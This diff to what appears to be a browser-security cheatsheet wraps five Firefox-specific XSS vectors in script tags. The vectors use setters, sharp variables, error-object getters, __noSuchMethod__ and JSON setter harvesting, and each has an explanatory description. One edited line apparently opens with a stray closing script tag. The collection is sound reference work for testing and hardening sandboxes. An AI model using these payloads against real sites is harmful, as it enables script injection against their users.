@@ -163,7 +163,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%',
+        'data'       : '<script>({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%</script>',
         'description': {
             'en' : 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
             'ja' : 'Gecko\u002fFirefox\u306esetter\u306b\u3088\u308b\u62ec\u5f27\u3092\u4f7f\u308f\u306a\u3044JavaScript\u306e\u5b9f\u884c',
@@ -457,7 +457,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '({0:#0=%js_alert_only%/#0#/#0#(0)})',
+        'data'       : '<script>({0:#0=%js_alert_only%/#0#/#0#(0)})</script>',
         'description': {
             'en' : 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
             'ja' : '',
@@ -612,7 +612,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : 'ReferenceError.prototype.__defineGetter__(\'name\', function(){%js_alert%}),x',
+        'data'       : '<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){%js_alert%}),x</script>',
         'description': {
             'en' : 'This JavaScript vector shows how overwriting the ReferenceError object and causing the exact same kind of error afterwards can lead to JavaScript execution. This is of course the same for most oher error objects and should ba taken into consideration when implementing JavaScript sandboxes or comparable.',
             'ja' : '',
@@ -644,7 +644,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : 'Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()',
+        'data'       : '</script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
         'description': {
             'en' : 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
             'ja' : '',
@@ -1684,7 +1684,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]',
+        'data'       : '<script>[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]</script>',
         'description': {
             'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
             'ja' : '',
